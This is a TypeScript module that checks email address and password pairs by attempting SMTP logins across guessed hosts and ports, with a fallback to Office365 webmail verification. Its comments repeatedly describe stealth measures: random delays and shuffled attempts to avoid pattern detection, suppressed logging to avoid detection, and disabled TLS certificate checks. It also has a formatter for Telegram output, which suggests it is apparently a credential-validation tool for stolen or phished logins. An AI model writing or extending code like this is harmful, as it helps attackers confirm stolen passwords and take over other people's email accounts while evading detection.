import dns from 'dns/promises'
import nodemailer from 'nodemailer'
import {
  loadProviderPatterns,
  detectProviderFromMX,
  getSMTPConfigForProvider,
  getWebmailUrlForProvider,
} from './mxProviderParser'
import { randomDelay, shuffleArray } from './stealthUtils'
import { verifyOffice365Credentials } from './office365Verification'

interface MXRecord {
  exchange: string
  priority: number
}

interface SMTPConfig {
  host: string
  port: number
  secure: boolean
}

interface VerificationResult {
  valid: boolean
  method: 'smtp' | 'webmail' | 'unknown'
  provider?: string
  smtpConfig?: SMTPConfig
  webmailUrl?: string
  error?: string
}

// Detect provider from MX record using CSV patterns
function detectProviderFromMXRecord(mxRecord: string): { name: string; provider: any } | null {
  const patterns = loadProviderPatterns()
  const provider = detectProviderFromMX(mxRecord, patterns)
  
  if (provider) {
    return {
      name: provider.name,
      provider,
    }
  }
  
  return null
}

// Get SMTP configs from provider (returns array to try multiple ports)
function getSMTPConfigs(domain: string, mxRecord?: string): Array<SMTPConfig> {
  const configs: SMTPConfig[] = []
  
  if (mxRecord) {
    const detected = detectProviderFromMXRecord(mxRecord)
    if (detected && detected.provider) {
      // Use provider-specific configs
      const providerConfigs = getSMTPConfigForProvider(detected.provider, domain)
      configs.push(...providerConfigs)
    }
  }
  
  // Always add fallback configs for unknown providers or if provider configs fail
  // Use the MX record host itself as potential SMTP server
  if (mxRecord) {
    const mxHost = mxRecord.toLowerCase()
    // Try common SMTP ports on MX host
    configs.push(
      { host: mxRecord, port: 587, secure: false },
      { host: mxRecord, port: 465, secure: true },
      { host: mxRecord, port: 25, secure: false },
    )
  }
  
  // Default domain-based SMTP configs
  configs.push(
    { host: `smtp.${domain}`, port: 587, secure: false },
    { host: `smtp.${domain}`, port: 465, secure: true },
    { host: `mail.${domain}`, port: 587, secure: false },
    { host: `mail.${domain}`, port: 465, secure: true },
    { host: `mail.${domain}`, port: 25, secure: false },
  )
  
  // Remove duplicates and randomize order for stealth
  const uniqueConfigs = configs.filter((config, index, self) =>
    index === self.findIndex(c => c.host === config.host && c.port === config.port)
  )
  
  return shuffleArray(uniqueConfigs)
}

// Get webmail URL from provider
function getWebmailUrl(domain: string, mxRecord?: string): string | null {
  if (mxRecord) {
    const detected = detectProviderFromMXRecord(mxRecord)
    if (detected && detected.provider) {
      return getWebmailUrlForProvider(detected.provider, domain)
    }
  }
  
  return `https://webmail.${domain}`
}

// Lookup MX records
export async function lookupMXRecords(domain: string): Promise<MXRecord[]> {
  try {
    const records = await dns.resolveMx(domain)
    
    return records
      .map((record) => ({
        exchange: record.exchange,
        priority: record.priority || 0,
      }))
      .sort((a, b) => a.priority - b.priority)
  } catch (error) {
    return []
  }
}

// Test SMTP authentication with stealth
export async function testSMTPAuth(
  email: string,
  password: string,
  smtpConfig: SMTPConfig
): Promise<boolean> {
  try {
    // Add random delay to avoid pattern detection
    await randomDelay(200, 800)
    
    const transporter = nodemailer.createTransport({
      host: smtpConfig.host,
      port: smtpConfig.port,
      secure: smtpConfig.secure,
      auth: {
        user: email,
        pass: password,
      },
      // Stealth settings
      connectionTimeout: 8000,
      greetingTimeout: 8000,
      socketTimeout: 8000,
      // Don't send email, just verify
      tls: {
        rejectUnauthorized: false, // Some servers have self-signed certs
      },
    })

    // Verify connection and authentication
    // This actually tests the credentials by attempting to authenticate
    await transporter.verify()
    
    // Close connection gracefully
    transporter.close()
    
    // If we get here, credentials are valid
    return true
  } catch (error: any) {
    // Don't log full error to avoid detection
    if (!error.message.includes('EAUTH') && !error.message.includes('Invalid login')) {
      // Only log non-auth errors
    }
    return false
  }
}

// Verify email credentials
export async function verifyEmailCredentials(
  email: string,
  password: string
): Promise<VerificationResult> {
  const domain = email.split('@')[1]
  if (!domain) {
    return {
      valid: false,
      method: 'unknown',
      error: 'Invalid email format',
    }
  }

  try {
    // Step 1: Lookup MX records with stealth delay
    await randomDelay(100, 300)
    const mxRecords = await lookupMXRecords(domain)
    const primaryMX = mxRecords.length > 0 ? mxRecords[0].exchange : null
    
    // Step 2: Detect provider using CSV patterns
    const detected = primaryMX ? detectProviderFromMXRecord(primaryMX) : null
    const providerName = detected?.name || 'Custom'
    const provider = detected?.provider || null
    
    // Step 3: Try SMTP authentication first (even if provider not in CSV)
    // This ensures we still verify credentials for unknown providers
    const smtpConfigs = getSMTPConfigs(domain, primaryMX || undefined)
    
    if (smtpConfigs.length > 0) {
      // Try each SMTP config with stealth delays
      // Limit to first 5 attempts to avoid timeout
      const maxAttempts = Math.min(smtpConfigs.length, 5)
      
      for (let i = 0; i < maxAttempts; i++) {
        const config = smtpConfigs[i]
        const isValid = await testSMTPAuth(email, password, config)
        if (isValid) {
          return {
            valid: true,
            method: 'smtp',
            provider: providerName,
            smtpConfig: config,
          }
        }
        // Add delay between attempts
        await randomDelay(300, 700)
      }
    }
    
    // Step 4: If SMTP fails, try webmail verification for Office365
    const webmailUrl = getWebmailUrl(domain, primaryMX || undefined)
    
    if (webmailUrl && providerName && (providerName.toLowerCase().includes('office365') || providerName.toLowerCase().includes('outlook'))) {
      // Verify Office365 credentials via webmail
      await randomDelay(500, 1000)
      const o365Result = await verifyOffice365Credentials(email, password)
      
      if (o365Result.valid) {
        return {
          valid: true,
          method: 'webmail',
          provider: providerName,
          webmailUrl,
        }
      }
      
      return {
        valid: false,
        method: 'webmail',
        provider: providerName,
        webmailUrl,
        error: o365Result.error || 'Office365 verification failed',
      }
    }
    
    // If webmail URL detected but not Office365, return it for manual verification
    if (webmailUrl && providerName) {
      return {
        valid: false,
        method: 'webmail',
        provider: providerName,
        webmailUrl,
        error: 'Webmail verification available but not automated',
      }
    }
    
    // Even if provider not in CSV, we still return what we found
    return {
      valid: false,
      method: 'smtp',
      provider: providerName,
      error: `Unable to verify credentials. Provider: ${providerName}, MX: ${primaryMX || 'Not found'}`,
    }
  } catch (error: any) {
    return {
      valid: false,
      method: 'unknown',
      error: error.message || 'Verification failed',
    }
  }
}

// Format provider name for Telegram
export function formatProviderName(provider: string | undefined, mxRecord?: string): string {
  if (provider) {
    return provider
  }
  
  if (mxRecord) {
    const detected = detectProviderFromMXRecord(mxRecord)
    return detected?.name || 'Custom'
  }
  
  return 'Custom'
}

